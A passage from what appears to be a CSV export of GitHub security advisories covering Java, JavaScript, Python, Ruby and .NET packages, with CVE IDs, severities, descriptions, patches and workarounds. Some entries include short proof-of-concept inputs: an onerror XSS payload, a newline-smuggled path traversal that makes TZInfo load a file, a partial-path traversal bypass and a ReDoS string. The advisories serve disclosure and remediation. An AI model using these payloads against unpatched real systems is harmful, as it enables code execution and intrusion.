This vulnerability exists because `File.mkdir` returns `false` when it fails to create a directory, it does not throw an exception. As such, the following race condition exists:

```java
File tmpDir =File.createTempFile(prefix + ""."", ""."" + getPort()); // Attacker knows the full path of the file that will be generated
// delete the file that was created
tmpDir.delete(); // Attacker sees file is deleted and begins a race to create their own directory before Jetty.
// and make a directory of the same name
// SECURITY VULNERABILITY: Race Condition! - Attacker beats java code and now owns this directory
tmpDir.mkdirs(); // This method returns 'false' because it was unable to create the directory. No exception is thrown.
// Attacker can write any new files to this directory that they wish.
// Attacker can read any files created by this process.
```

### Prerequisites

This vulnerability impacts Unix-like systems, and very old versions of Mac OSX and Windows as they all share the system temporary directory between all users.

### Patches

This vulnerability was inadvertently fixed as a part of this patch: https://github.com/spring-projects/spring-boot/commit/667ccdae84822072f9ea1a27ed5c77964c71002d

This vulnerability is patched in versions `v2.2.11.RELEASE` or later.

### Workarounds

Setting the `java.io.tmpdir` system environment variable to a directory that is exclusively owned by the executing user will fix this vulnerability for all operating systems.",maven
2903,34577,org.apache.solr:solr-core,GHSA-6cpj-3g83-q2j4,CVE-2012-6612,https://github.com/advisories/GHSA-6cpj-3g83-q2j4,high,2022-05-17 04:50:16 UTC,Improper Restriction of XML External Entity Reference in Apache Solr,"The (1) UpdateRequestHandler for XSLT or (2) XPathEntityProcessor in Apache Solr before 4.1 allows remote attackers to have an unspecified impact via XML data containing an external entity declaration in conjunction with an entity reference, related to an XML External Entity (XXE) issue, different vectors than CVE-2013-6407.",maven
2904,26743,ember-source,GHSA-5m48-c37x-f792,CVE-2013-4170,https://github.com/advisories/GHSA-5m48-c37x-f792,moderate,2022-07-01 00:01:11 UTC,Ember.js Potential XSS Exploit When Binding `tagName` to User-Supplied Data,"In general, Ember.js escapes or strips any user-supplied content before inserting it in strings that will be sent to innerHTML. However, the `tagName` property of an `Ember.View` was inserted into such a string without being sanitized. This means that if an application assigns a view's `tagName` to user-supplied data, a specially-crafted payload could execute arbitrary JavaScript in the context of the current domain (""XSS""). This vulnerability only affects applications that assign or bind user-provided content to `tagName`.",rubygems
2905,18828,activerecord,GHSA-3hhc-qp5v-9p2j,CVE-2022-32224,https://github.com/advisories/GHSA-3hhc-qp5v-9p2j,high,2022-07-12 19:39:47 UTC,Active Record RCE bug with Serialized Columns,"When serialized columns that use YAML (the default) are deserialized, Rails uses YAML.unsafe_load to convert the YAML data in to Ruby objects. If an attacker can manipulate data in the database (via means like SQL injection), then it may be possible for the attacker to escalate to an RCE.

There are no feasible workarounds for this issue, but other coders (such as JSON) are not impacted.",rubygems
2906,34125,org.apache.hadoop:hadoop-client,GHSA-qmh2-h7r6-gm6q,CVE-2012-3376,https://github.com/advisories/GHSA-qmh2-h7r6-gm6q,high,2022-05-17 02:54:07 UTC,Client BlockTokens not checked in Apache Hadoop,"DataNodes in Apache Hadoop 2.0.0 alpha does not check the BlockTokens of clients when Kerberos is enabled and the DataNode has checked out the same BlockPool twice from a NodeName, which might allow remote clients to read arbitrary blocks, write to blocks to which they only have read access, and have other unspecified impacts.",maven
2907,34003,org.apache.commons:commons-compress,GHSA-6fxm-66hq-fc96,CVE-2012-2098,https://github.com/advisories/GHSA-6fxm-66hq-fc96,moderate,2022-05-13 01:07:05 UTC,Uncontrolled Resource Consumption in Apache Commons Compress,Algorithmic complexity vulnerability in the sorting algorithms in bzip2 compressing stream (BZip2CompressorOutputStream) in Apache Commons Compress before 1.4.1 allows remote attackers to cause a denial of service (CPU consumption) via a file with many repeating inputs.,maven
2908,34974,org.apache.struts:struts2-core,GHSA-8m5q-crqq-6pmf,CVE-2012-1592,https://github.com/advisories/GHSA-8m5q-crqq-6pmf,high,2022-04-23 00:40:23 UTC,Unrestricted Upload of File with Dangerous Type in Apache Struts2,"A local code execution issue exists in Apache Struts2 when processing malformed XSLT files, which could let a malicious user upload and execute arbitrary files. A patch exists as of version 2.5.22.",maven
2909,34676,org.jboss.resteasy:resteasy-client,GHSA-wrrh-g7h3-gqmx,CVE-2012-0818,https://github.com/advisories/GHSA-wrrh-g7h3-gqmx,moderate,2022-05-17 01:49:58 UTC,Exposure of Sensitive Information to an Unauthorized Actor in RESTEasy,"RESTEasy before 2.3.1 allows remote attackers to read arbitrary files via an external entity reference in a DOM document, aka an XML external entity (XXE) injection attack.",maven
2910,34426,org.apache.activemq:activemq-core,GHSA-9wcx-326r-7j7w,CVE-2011-4905,https://github.com/advisories/GHSA-9wcx-326r-7j7w,moderate,2022-05-17 05:35:59 UTC,Denial of Service in Apache ActiveMQ,Apache ActiveMQ before 5.6.0 allows remote attackers to cause a denial of service (file-descriptor exhaustion and broker crash or hang) by sending many openwire failover:tcp:// connection requests.,maven
2911,33935,org.eclipse.jetty:jetty-server,GHSA-qxp4-27vx-xmm3,CVE-2011-4461,https://github.com/advisories/GHSA-qxp4-27vx-xmm3,moderate,2022-05-14 01:27:35 UTC,Improper Input Validation in Jetty,"Jetty 8.1.0.RC2 and earlier computes hash values for form parameters without restricting the ability to trigger hash collisions predictably, which allows remote attackers to cause a denial of service (CPU consumption) by sending many crafted parameters.",maven
2912,34025,org.springframework.security:spring-security-core,GHSA-f866-m9mv-2xr3,CVE-2011-2894,https://github.com/advisories/GHSA-f866-m9mv-2xr3,moderate,2022-05-14 02:54:56 UTC,Spring Framework and Spring Security vulnerable to Deserialization of Untrusted Data,"Spring Framework 3.0.0 through 3.0.5, Spring Security 3.0.0 through 3.0.5 and 2.0.0 through 2.0.6, and possibly other versions deserialize objects from untrusted sources, which allows remote attackers to bypass intended security restrictions and execute untrusted code by (1) serializing a java.lang.Proxy instance and using InvocationHandler, or (2) accessing internal AOP interfaces, as demonstrated using deserialization of a DefaultListableBeanFactory instance to execute arbitrary commands via the java.lang.Runtime class.",maven
2913,33906,org.springframework:spring-core,GHSA-f866-m9mv-2xr3,CVE-2011-2894,https://github.com/advisories/GHSA-f866-m9mv-2xr3,moderate,2022-05-14 02:54:56 UTC,Spring Framework and Spring Security vulnerable to Deserialization of Untrusted Data,"Spring Framework 3.0.0 through 3.0.5, Spring Security 3.0.0 through 3.0.5 and 2.0.0 through 2.0.6, and possibly other versions deserialize objects from untrusted sources, which allows remote attackers to bypass intended security restrictions and execute untrusted code by (1) serializing a java.lang.Proxy instance and using InvocationHandler, or (2) accessing internal AOP interfaces, as demonstrated using deserialization of a DefaultListableBeanFactory instance to execute arbitrary commands via the java.lang.Runtime class.",maven
2914,34025,org.springframework.security:spring-security-core,GHSA-5xm9-rf63-wj7h,CVE-2011-2732,https://github.com/advisories/GHSA-5xm9-rf63-wj7h,moderate,2022-05-17 05:18:15 UTC,Improper Control of Generation of Code in Spring Security,CRLF injection vulnerability in the logout functionality in VMware SpringSource Spring Security before 2.0.7 and 3.0.x before 3.0.6 allows remote attackers to inject arbitrary HTTP headers and conduct HTTP response splitting attacks via the spring-security-redirect parameter.,maven
2915,34025,org.springframework.security:spring-security-core,GHSA-4644-hg35-55m9,CVE-2011-2731,https://github.com/advisories/GHSA-4644-hg35-55m9,moderate,2022-05-17 04:59:50 UTC,Concurrent Execution using Shared Resource with Improper Synchronization in Spring Security,"Race condition in the RunAsManager mechanism in VMware SpringSource Spring Security before 2.0.7 and 3.0.x before 3.0.6 stores the Authentication object in the shared security context, which allows attackers to gain privileges via a crafted thread.",maven
2916,33906,org.springframework:spring-core,GHSA-wv88-pf73-x22p,CVE-2011-2730,https://github.com/advisories/GHSA-wv88-pf73-x22p,high,2022-05-17 02:16:01 UTC,Improper Neutralization of Directives in Dynamically Evaluated Code in Spring Framework,"VMware SpringSource Spring Framework before 2.5.6.SEC03, 2.5.7.SR023, and 3.x before 3.0.6, when a container supports Expression Language (EL), evaluates EL expressions in tags twice, which allows remote attackers to obtain sensitive information via a (1) name attribute in a (a) spring:hasBindErrors tag; (2) path attribute in a (b) spring:bind or (c) spring:nestedpath tag; (3) arguments, (4) code, (5) text, (6) var, (7) scope, or (8) message attribute in a (d) spring:message or (e) spring:theme tag; or (9) var, (10) scope, or (11) value attribute in a (f) spring:transform tag, aka ""Expression Language Injection.""",maven
2917,35696,org.apache.ws.security:wss4j,GHSA-4qqf-hmv6-r6wh,CVE-2011-2487,https://github.com/advisories/GHSA-4qqf-hmv6-r6wh,moderate,2022-04-22 00:24:28 UTC,Use of a Broken or Risky Cryptographic Algorithm  in Apache WSS4J,The implementations of PKCS#1 v1.5 key transport mechanism for XMLEncryption in JBossWS and Apache WSS4J before 1.6.5 is susceptible to a Bleichenbacher attack.,maven
2918,33885,org.apache.httpcomponents:httpclient,GHSA-gw85-4gmf-m7rh,CVE-2011-1498,https://github.com/advisories/GHSA-gw85-4gmf-m7rh,moderate,2022-05-17 05:39:03 UTC,Exposure of Sensitive Information to an Unauthorized Actor in Apache HttpClient,"Apache HttpClient 4.x before 4.1.1 in Apache HttpComponents, when used with an authenticating proxy server, sends the Proxy-Authorization header to the origin server, which allows remote web servers to obtain sensitive information by logging this header.",maven
2919,35270,org.opensaml:opensaml,GHSA-qwwj-qj3f-9hv7,CVE-2011-1411,https://github.com/advisories/GHSA-qwwj-qj3f-9hv7,moderate,2022-05-17 05:02:41 UTC,Improper Authentication in OpenSAML,"Shibboleth OpenSAML library 2.4.x before 2.4.3 and 2.5.x before 2.5.1, and IdP before 2.3.2, allows remote attackers to forge messages and bypass authentication via an ""XML Signature wrapping attack.""",maven
2920,37174,org.apache.qpid:qpid-client,GHSA-mrgh-6x42-x6xf,CVE-2012-4446,https://github.com/advisories/GHSA-mrgh-6x42-x6xf,moderate,2022-05-17 05:13:24 UTC,Improper Authentication in Apache Qpid,"The default configuration for Apache Qpid 0.20 and earlier, when the federation_tag attribute is enabled, accepts AMQP connections without checking the source user ID, which allows remote attackers to bypass authentication and have other unspecified impact via an AMQP request.",maven
2921,34025,org.springframework.security:spring-security-core,GHSA-3533-rvpc-6x56,CVE-2012-5055,https://github.com/advisories/GHSA-3533-rvpc-6x56,moderate,2022-05-17 05:17:30 UTC,Exposure of Sensitive Information to an Unauthorized Actor in Spring Security,"DaoAuthenticationProvider in VMware SpringSource Spring Security before 2.0.8, 3.0.x before 3.0.8, and 3.1.x before 3.1.3 does not check the password if the user is not found, which makes the response delay shorter and might allow remote attackers to enumerate valid usernames via a series of login requests.",maven
2922,34259,org.apache.cxf:cxf-rt-transports-http,GHSA-7v5v-9v8r-w864,CVE-2012-5575,https://github.com/advisories/GHSA-7v5v-9v8r-w864,moderate,2022-05-13 01:09:21 UTC,Inadequate Encryption Strength in Apache CXF,"Apache CXF 2.5.x before 2.5.10, 2.6.x before CXF 2.6.7, and 2.7.x before CXF 2.7.4 does not verify that a specified cryptographic algorithm is allowed by the WS-SecurityPolicy AlgorithmSuite definition before decrypting, which allows remote attackers to force CXF to use weaker cryptographic algorithms than intended and makes it easier to decrypt communications, aka ""XML Encryption backwards compatibility attack.""",maven
2923,33885,org.apache.httpcomponents:httpclient,GHSA-3832-9276-x7gf,CVE-2012-5783,https://github.com/advisories/GHSA-3832-9276-x7gf,moderate,2022-05-13 01:10:34 UTC,Improper Certificate Validation in apache HttpClient,"Apache Commons HttpClient 3.x, as used in Amazon Flexible Payments Service (FPS) merchant Java SDK and other products, does not verify that the server hostname matches a domain name in the subject's Common Name (CN) or subjectAltName field of the X.509 certificate, which allows man-in-the-middle attackers to spoof SSL servers via an arbitrary valid certificate.",maven
2924,20461,distributed,GHSA-hwqr-f3v9-hwxr,,https://github.com/advisories/GHSA-hwqr-f3v9-hwxr,moderate,2022-07-15 21:56:08 UTC,Workers for local Dask clusters mistakenly listened on public interfaces,"Versions of `distributed` earlier than `2021.10.0` had a potential security vulnerability relating to single-machine Dask clusters.

Clusters started with `dask.distributed.LocalCluster` or `dask.distributed.Client()` (which defaults to using `LocalCluster`) would mistakenly configure their respective Dask workers to listen on external interfaces (typically with a randomly selected high port) rather than only on `localhost`. A Dask cluster created using this method AND running on a machine that has these ports exposed could be used by a sophisticated attacker to enable remote code execution. Users running on machines with standard firewalls in place, or using clusters created via cluster objects other than `LocalCluster` (e.g. `dask_kubernetes.KubeCluster`) should not be affected. This vulnerability is documented in CVE-2021-42343, and was fixed in version `2021.10.0` (PR #5427).",pip
2925,34497,io.undertow:undertow-core,GHSA-339q-62wm-c39w,CVE-2021-3859,https://github.com/advisories/GHSA-339q-62wm-c39w,high,2022-07-15 21:32:13 UTC,Undertow vulnerable to Denial of Service (DoS) attacks,"Undertow client side invocation timeout raised when calling over HTTP2, this vulnerability can allow attacker to carry out denial of service (DoS) attacks in versions less than 2.2.15 Final.",maven
2926,34497,io.undertow:undertow-core,GHSA-fj7c-vg2v-ccrm,CVE-2021-3690,https://github.com/advisories/GHSA-fj7c-vg2v-ccrm,high,2022-07-15 21:07:20 UTC,Undertow vulnerable to memory exhaustion due to buffer leak,Buffer leak on incoming WebSocket PONG message(s) in Undertow before 2.0.40 and 2.2.10 can lead to memory exhaustion and allow a denial of service.,maven
2927,28929,salt,GHSA-jmv9-5gx8-7xpf,CVE-2013-4439,https://github.com/advisories/GHSA-jmv9-5gx8-7xpf,moderate,2022-05-17 04:58:30 UTC,Minion identity not validated in saltstack,Salt (aka SaltStack) before 0.15.0 through 0.17.0 allows remote authenticated minions to impersonate arbitrary minions via a crafted minion with a valid key.,pip
2928,34312,com.amazonaws:aws-java-sdk-s3,GHSA-c28r-hw5m-5gv3,CVE-2022-31159,https://github.com/advisories/GHSA-c28r-hw5m-5gv3,high,2022-07-15 20:44:55 UTC,Partial Path Traversal in com.amazonaws:aws-java-sdk-s3,"### Overview

A partial-path traversal issue exists within the `downloadDirectory` method in the AWS S3 TransferManager component of the AWS SDK for Java v1. Applications using the SDK control the `destinationDirectory` argument, but S3 object keys are determined by the application that uploaded the objects. The `downloadDirectory` method allows the caller to pass a filesystem object in the object key but contained an issue in the validation logic for the key name. A knowledgeable actor could bypass the validation logic by including a UNIX double-dot in the bucket key. Under certain conditions, this could permit them to retrieve a directory from their S3 bucket that is one level up in the filesystem from their working directory. 

This issue’s scope is limited to directories whose name prefix matches the destinationDirectory. E.g. for destination directory`/tmp/foo`, the actor can cause a download to `/tmp/foo-bar`, but not `/tmp/bar`. 

Versions of the AWS Java SDK for S3 v1 before and including v1.12.260 are affected by this issue. 

### Impact

If `com.amazonaws.services.s3.transfer.TransferManager::downloadDirectory` is used to download an untrusted buckets contents, the contents of that bucket can be written outside of the intended destination directory.

#### Root Cause

The `com.amazonaws.services.s3.transfer.TransferManager::downloadDirectory` contains a partial-path traversal vulnerability.

This is due to the guard logic in `leavesRoot` containing an insufficient protection against partial-path traversal.

https://github.com/aws/aws-sdk-java/blob/5be0807af763b9fbf6b0a153c76dd305e407f035/aws-java-sdk-s3/src/main/java/com/amazonaws/services/s3/transfer/TransferManager.java#L1513-L1519

The application controls the `localBaseDirectory` argument, but the `key` comes from the AWS bucket entry (ie. can be attacker controlled). The above bit of logic can be bypassed with the following payloads:

```java
// The following will return 'false', although the attacker value will ""leave"" the `/usr/foo` directory
leavesRoot(new File(""/usr/foo""), ""/../foo-bar/bar"")
```

This guard is used here which should guard against path traversal, however `leavesRoot` is an insufficient guard:

https://github.com/aws/aws-sdk-java/blob/ae88c8aa4b195047b94c154897475f85642d7eb3/aws-java-sdk-s3/src/main/java/com/amazonaws/services/s3/transfer/TransferManager.java#L1420-L1423

#### True Root cause

 If the result of `parent.getCanonicalPath()` is not slash terminated it allows for partial path traversal.

> Consider `""/usr/outnot"".startsWith(""/usr/out"")`. The check is bypassed although `outnot` is not under the `out` directory.
The terminating slash may be removed in various places. On Linux `println(new File(""/var/""))` returns `/var`, but `println(new File(""/var"", ""/""))` - `/var/`, however `println(new File(""/var"", ""/"").getCanonicalPath())` - `/var`.
 \- [@JarLob (Jaroslav Lobačevski)](https://github.com/JarLob)

### Patches

Upgrade to the AWS SDK for Java >= 1.12.261, if you are on a version < 1.12.261.

### Workarounds

When calling `com.amazonaws.services.s3.transfer.TransferManager::downloadDirectory` pass a `KeyFilter` that forbids `S3ObjectSummary` objects that `getKey` method return a string containing the substring `..` .

### References

Similar vulnerabilities:
 - ESAPI (The OWASP Enterprise Security API) - https://nvd.nist.gov/vuln/detail/CVE-2022-23457

### For more information

If you have any questions or comments about this advisory, please contact [AWS's Security team](mailto:aws-security@amazon.com).
",maven
2929,33879,com.fasterxml.jackson.core:jackson-databind,GHSA-rpr3-cw39-3pxh,CVE-2020-10650,https://github.com/advisories/GHSA-rpr3-cw39-3pxh,high,2022-07-15 19:41:47 UTC,jackson-databind before 2.9.10.4 vulnerable to unsafe deserialization,The com.fasterxml.jackson.core:jackson-databind library before versions 2.9.10.4 is vulnerable to an Unsafe Deserialization vulnerability when handling interactions related to the class `ignite-jta`.,maven
2930,20256,codecov,GHSA-h3qr-fjhm-jphw,CVE-2019-10800,https://github.com/advisories/GHSA-h3qr-fjhm-jphw,moderate,2022-07-14 00:00:23 UTC,Codecov prior to 2.0.16 does not sanitize gcov arguments,This affects the package codecov before 2.0.16. The vulnerability occurs due to not sanitizing gcov arguments before being being provided to the popen method.,pip
2931,34929,org.apache.tapestry:tapestry-core,GHSA-227g-7cvv-6ff3,CVE-2022-31781,https://github.com/advisories/GHSA-227g-7cvv-6ff3,high,2022-07-14 00:00:23 UTC,Apache Tapestry 5.8.1 vulnerable to ReDoS via Content Types causing catastrophic backtracking,"Apache Tapestry up to version 5.8.1 is vulnerable to Regular Expression Denial of Service (ReDoS) in the way it handles Content Types. Specially crafted Content Types may cause catastrophic backtracking, taking exponential time to complete. Specifically, this is about the regular expression used on the parameter of the org.apache.tapestry5.http.ContentType class. Apache Tapestry 5.8.2 has a fix for this vulnerability. Notice the vulnerability cannot be triggered by web requests in Tapestry code alone. It would only happen if there's some non-Tapestry codepath passing some outside input to the ContentType class constructor.",maven
2932,35538,org.jvnet.hudson.main:hudson-core,GHSA-j3h2-8mf8-j5r2,CVE-2015-8031,https://github.com/advisories/GHSA-j3h2-8mf8-j5r2,critical,2022-07-15 18:12:47 UTC,Hudson XML API susceptible to External Entity Injection Vunerability prior to v3.3.2,"In versions prior to 3.3.2, Hudson exhibits a flaw in its XML API processing that can allow access to potentially sensitive information on the filesystem of the Hudson master server.",maven
2933,17192,svelte,GHSA-wv8q-r932-8hc7,CVE-2022-25875,https://github.com/advisories/GHSA-wv8q-r932-8hc7,moderate,2022-07-13 00:00:41 UTC,Svelte before 3.49.0 vulnerable to XSS when using objects during server-side rendering,The package svelte before 3.49.0 is vulnerable to Cross-site Scripting (XSS) due to improper input sanitization and to improper escape of attributes when using objects during SSR (Server-Side Rendering). Exploiting this vulnerability is possible via objects with a custom toString() function.,npm
2934,36163,io.fabric8:kubernetes-client,GHSA-98g7-rxmf-rrxm,CVE-2021-4178,https://github.com/advisories/GHSA-98g7-rxmf-rrxm,moderate,2022-07-15 05:17:35 UTC,fabric8 kubernetes-client vulnerable,fabric8 Kubernetes client had an arbitrary code execution flaw in versions 5.0.0-beta-1 and higher. Attackers could potentially insert malicious YAMLs due to misconfigured YAML parsing.,maven
2935,17417,jquery-ui,GHSA-h6gj-6jjq-h8g9,CVE-2022-31160,https://github.com/advisories/GHSA-h6gj-6jjq-h8g9,moderate,2022-07-18 17:07:36 UTC,jQuery UI vulnerable to XSS when refreshing a checkboxradio with an HTML-like initial text label,"### Impact
Initializing a checkboxradio widget on an input enclosed within a label makes that parent label contents considered as the input label. If you call `.checkboxradio( ""refresh"" )` on such a widget and the initial HTML contained encoded HTML entities, they will erroneously get decoded. This can lead to potentially executing JavaScript code.

For example, starting with the following initial secure HTML:
```html
<label>
	<input id=""test-input"">
	&lt;img src=x onerror=""alert(1)""&gt;
</label>
```
and calling:
```js
$( ""#test-input"" ).checkboxradio();
$( ""#test-input"" ).checkboxradio( ""refresh"" );
```
will turn the initial HTML into:
```html
<label>
	<!-- some jQuery UI elements -->
	<input id=""test-input"">
	<img src=x onerror=""alert(1)"">
</label>
```
and the alert will get executed.

### Patches
The bug has been patched in jQuery UI 1.13.2.

### Workarounds
To remediate the issue, if you can change the initial HTML, you can wrap all the non-input contents of the `label` in a `span`:
```html
<label>
	<input id=""test-input"">
	<span>&lt;img src=x onerror=""alert(1)""&gt;</span>
</label>
```

### References
https://blog.jqueryui.com/2022/07/jquery-ui-1-13-2-released/

### For more information
If you have any questions or comments about this advisory, search for a relevant issue in [the jQuery UI repo](https://github.com/jquery/jquery-ui/issues?q=is%3Aissue+is%3Aopen+sort%3Aupdated-desc). If you don't find an answer, open a new issue.",npm
2936,27851,gollum,GHSA-fj2w-qmjp-3rjm,CVE-2020-35305,https://github.com/advisories/GHSA-fj2w-qmjp-3rjm,moderate,2022-07-16 00:00:28 UTC,Gollum Cross-site Scripting vulnerability via filename parameter to New Page dialog,Cross site scripting (XSS) in gollum 5.0 to 5.1.2 via the filename parameter to the 'New Page' dialog.,rubygems
2937,16562,terser,GHSA-4wf5-vphf-c2xc,CVE-2022-25858,https://github.com/advisories/GHSA-4wf5-vphf-c2xc,high,2022-07-16 00:00:20 UTC,Terser insecure use of regular expressions before v4.8.1 and v5.14.2 leads to ReDoS,"The package terser before 4.8.1, from 5.0.0 and before 5.14.2 are vulnerable to Regular Expression Denial of Service (ReDoS) due to insecure usage of regular expressions.",npm
2938,16174,angular,GHSA-prc3-vjfx-vhm9,CVE-2022-25869,https://github.com/advisories/GHSA-prc3-vjfx-vhm9,moderate,2022-07-16 00:00:20 UTC,Angular (deprecated package) Cross-site Scripting,"All versions of package angular are vulnerable to Cross-site Scripting (XSS) due to insecure page caching in the Internet Explorer browser, which allows interpolation of <textarea> elements.

NPM package [angular](https://www.npmjs.com/package/angular) is deprecated. Those who want to receive security updates should use the actively maintained package [@angular/core](https://www.npmjs.com/package/@angular/core).",npm
2939,19282,puppet,GHSA-vw22-465p-8j5w,CVE-2017-10689,https://github.com/advisories/GHSA-vw22-465p-8j5w,moderate,2022-05-13 01:41:57 UTC,Tarball permission preservation in puppet,"When installing a module using the system tar, the PMT will filter filesystem permissions to a sane value. This may just be based on the user's umask.

When using minitar, files are unpacked with whatever permissions are in the tarball. This is potentially unsafe, as tarballs can be easily created with weird permissions.
",rubygems
2940,34092,xalan:xalan,GHSA-9339-86wc-4qgf,CVE-2022-34169,https://github.com/advisories/GHSA-9339-86wc-4qgf,critical,2022-07-20 00:00:18 UTC,Apache Xalan Java XSLT library integer truncation issue when processing malicious XSLT stylesheets,"The Apache Xalan Java XSLT library is vulnerable to an integer truncation issue when processing malicious XSLT stylesheets. This can be used to corrupt Java class files generated by the internal XSLTC compiler and execute arbitrary Java bytecode.

A fix for this issue was published in September 2022 as part of an anticipated 2.7.3 release.",maven
2941,18981,tzinfo,GHSA-5cm2-9h8c-rvfx,CVE-2022-31163,https://github.com/advisories/GHSA-5cm2-9h8c-rvfx,high,2022-07-21 21:39:29 UTC,TZInfo relative path traversal vulnerability allows loading of arbitrary files,"### Impact

#### Affected versions

  - 0.3.60 and earlier.
  - 1.0.0 to 1.2.9 when used with the Ruby data source (tzinfo-data).

#### Vulnerability 

With the Ruby data source (the tzinfo-data gem for tzinfo version 1.0.0 and later and built-in to earlier versions), time zones are defined in Ruby files. There is one file per time zone. Time zone files are loaded with `require` on demand. In the affected versions, `TZInfo::Timezone.get` fails to validate time zone identifiers correctly, allowing a new line character within the identifier. With Ruby version 1.9.3 and later, `TZInfo::Timezone.get` can be made to load unintended files with `require`, executing them within the Ruby process.

For example, with version 1.2.9, you can run the following to load a file with path `/tmp/payload.rb`:

```ruby
TZInfo::Timezone.get(""foo\n/../../../../../../../../../../../../../../../../tmp/payload"")
```

The exact number of parent directory traversals needed will vary depending on the location of the tzinfo-data gem.

TZInfo versions 1.2.6 to 1.2.9 can be made to load files from outside of the Ruby load path. Versions up to and including 1.2.5 can only be made to load files from directories within the load path. 

This could be exploited in, for example, a Ruby on Rails application using tzinfo version 1.2.9, that allows file uploads and has a time zone selector that accepts arbitrary time zone identifiers. The CVSS score and severity have been set on this basis.

Versions 2.0.0 and later are not vulnerable.

### Patches

Versions 0.3.61 and 1.2.10 include fixes to correctly validate time zone identifiers (commit 9eddbb5c0e682736f61d0dd803b6031a5db9eadf for 0.3.x and commit 9905ca93abf7bf3e387bd592406e403cd18334c7 for 1.2.x).

Note that version 0.3.61 can still load arbitrary files from the Ruby load path if their name follows the rules for a valid time zone identifier and the file has a prefix of `tzinfo/definition` within a directory in the load path. For example if `/tmp/upload` was in the load path, then `TZInfo::Timezone.get('foo')` could load a file with path `/tmp/upload/tzinfo/definition/foo.rb`. Applications should ensure that untrusted files are not placed in a directory on the load path.

### Workarounds

As a workaround, the time zone identifier can be validated before passing to `TZInfo::Timezone.get` by ensuring it matches the regular expression `\A[A-Za-z0-9+\-_]+(?:\/[A-Za-z0-9+\-_]+)*\z`.

### For more information

If you have any questions or comments about this advisory:
  - Open an issue in [the tzinfo repository](https://github.com/tzinfo/tzinfo).",rubygems
2942,17196,file-type,GHSA-mhxj-85r3-2x55,CVE-2022-36313,https://github.com/advisories/GHSA-mhxj-85r3-2x55,high,2022-07-22 00:00:38 UTC,file-type vulnerable to Infinite Loop via malformed MKV file,An issue was discovered in the file-type package from 13.0.0 until 16.5.4 and 17.x before 17.1.3 for Node.js. A malformed MKV file could cause the file type detector to get caught in an infinite loop. This would make the application become unresponsive and could be used to cause a DoS attack when used on a web server.,npm
2943,12847,Microsoft.NETCore.App,GHSA-2xjx-v99w-gqf3,CVE-2019-0545,https://github.com/advisories/GHSA-2xjx-v99w-gqf3,high,2022-05-14 01:41:10 UTC,Exposure of Sensitive Information in System.Net.Http,"An information disclosure vulnerability exists in .NET Framework and .NET Core which allows bypassing Cross-origin Resource Sharing (CORS) configurations, aka "".NET Framework Information Disclosure Vulnerability."" This affects Microsoft .NET Framework 2.0, Microsoft .NET Framework 3.0, Microsoft .NET Framework 4.6.2/4.7/4.7.1/4.7.2, Microsoft .NET Framework 4.5.2, Microsoft .NET Framework 4.6, Microsoft .NET Framework 4.6/4.6.1/4.6.2/4.7/4.7.1/4.7.2, Microsoft .NET Framework 4.7/4.7.1/4.7.2, .NET Core 2.1, Microsoft .NET Framework 4.7.1/4.7.2, Microsoft .NET Framework 3.5, Microsoft .NET Framework 3.5.1, Microsoft .NET Framework 4.6/4.6.1/4.6.2, .NET Core 2.2, Microsoft .NET Framework 4.7.2.",nuget
2944,19859,simplejson,GHSA-9772-cwx9-r4cj,CVE-2014-4616,https://github.com/advisories/GHSA-9772-cwx9-r4cj,moderate,2022-05-14 02:05:09 UTC,simplejson before 2.6.1 vulnerable to array index error,Array index error in the scanstring function in the _json module in Python 2.7 through 3.5 and simplejson before 2.6.1 allows context-dependent attackers to read arbitrary process memory via a negative index value in the idx argument to the raw_decode function.,pip
2945,13480,Microsoft.AspNetCore.Owin,GHSA-hxrm-9w7p-39cc,CVE-2020-1045,https://github.com/advisories/GHSA-hxrm-9w7p-39cc,high,2022-05-24 17:27:57 UTC,Cookie parsing failure,"A security feature bypass vulnerability exists in the way Microsoft ASP.NET Core parses encoded cookie names.The ASP.NET Core cookie parser decodes entire cookie strings which could allow a malicious attacker to set a second cookie with the name being percent encoded.The security update addresses the vulnerability by fixing the way the ASP.NET Core cookie parser handles encoded names., aka 'Microsoft ASP.NET Core Security Feature Bypass Vulnerability'.",nuget
2946,28945,Flask-AppBuilder,GHSA-32ff-4g79-vgfc,CVE-2022-31177,https://github.com/advisories/GHSA-32ff-4g79-vgfc,low,2022-07-29 22:28:12 UTC,Flask-AppBuilder before v4.1.3 allows inference of sensitive information through query strings,"### Impact
An authenticated Admin user could craft HTTP requests to filter users by their salted and hashed passwords strings. These filters could be made by using partial hashed password strings. The response would not include the hashed passwords, but an attacker could infer partial password hashes and their respective users.

Only when using `AUTH_DB` database authentication option.

### Patches
Fixed on 4.1.3

### For more information
If you have any questions or comments about this advisory:
* Open an issue in [example link to repo](http://example.com)
* Email us at [example email address](mailto:example@example.com)
",pip
2947,20077,mistune,GHSA-fw3v-x4f2-v673,CVE-2022-34749,https://github.com/advisories/GHSA-fw3v-x4f2-v673,high,2022-07-26 00:00:27 UTC,Mistune v2.0.2 vulnerable to catastrophic backtracking,"In Mistune through 2.0.2, support of inline markup is implemented by using regular expressions that can involve a high amount of backtracking on certain edge cases. This behavior is commonly named catastrophic backtracking.",pip
2948,15978,node-fetch,GHSA-vp56-6g26-6827,CVE-2022-2596,https://github.com/advisories/GHSA-vp56-6g26-6827,moderate,2022-08-02 00:00:25 UTC,node-fetch Inefficient Regular Expression Complexity,"[node-fetch](https://www.npmjs.com/package/node-fetch) is a light-weight module that brings window.fetch to node.js.

Affected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) in the `isOriginPotentiallyTrustworthy()` function in `referrer.js`, when processing a URL string with alternating letters and periods, such as `'http://' + 'a.a.'.repeat(i) + 'a'`.",npm
2949,16038,mongoose,GHSA-f825-f98c-gj3g,CVE-2022-2564,https://github.com/advisories/GHSA-f825-f98c-gj3g,high,2022-07-29 00:00:18 UTC,automattic/mongoose vulnerable to Prototype pollution via Schema.path,Mongoose is a MongoDB object modeling tool designed to work in an asynchronous environment.\n\nAffected versions of this package are vulnerable to Prototype Pollution. The `Schema.path()` function is vulnerable to prototype pollution when setting the schema object. This vulnerability allows modification of the Object prototype and could be manipulated into a Denial of Service (DoS) attack.,npm
